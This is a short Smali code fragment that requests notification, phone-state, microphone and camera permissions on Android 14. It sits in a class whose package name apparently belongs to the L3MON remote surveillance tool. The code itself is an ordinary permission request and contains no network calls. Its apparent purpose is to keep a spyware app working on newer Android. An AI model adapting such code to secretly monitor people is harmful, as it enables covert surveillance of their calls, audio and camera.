    # Check and Request Permissions for Android 14
    const-string v0, "android.permission.POST_NOTIFICATIONS"
    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->checkSelfPermission(Ljava/lang/String;)I
    move-result v0
    if-eqz v0, :cond_request

    # Permissions to request
    const/4 v0, 0x4
    new-array v0, v0, [Ljava/lang/String;
    const/4 v1, 0x0
    const-string v2, "android.permission.POST_NOTIFICATIONS"
    aput-object v2, v0, v1
    const/4 v1, 0x1
    const-string v2, "android.permission.READ_PHONE_STATE"
    aput-object v2, v0, v1
    const/4 v1, 0x2
    const-string v2, "android.permission.RECORD_AUDIO"
    aput-object v2, v0, v1
    const/4 v1, 0x3
    const-string v2, "android.permission.CAMERA"
    aput-object v2, v0, v1

    # Request code: 101
    const/16 v1, 0x65
    invoke-virtual {p0, v0, v1}, Lcom/etechd/l3mon/MainActivity;->requestPermissions([Ljava/lang/String;I)V

    :cond_request
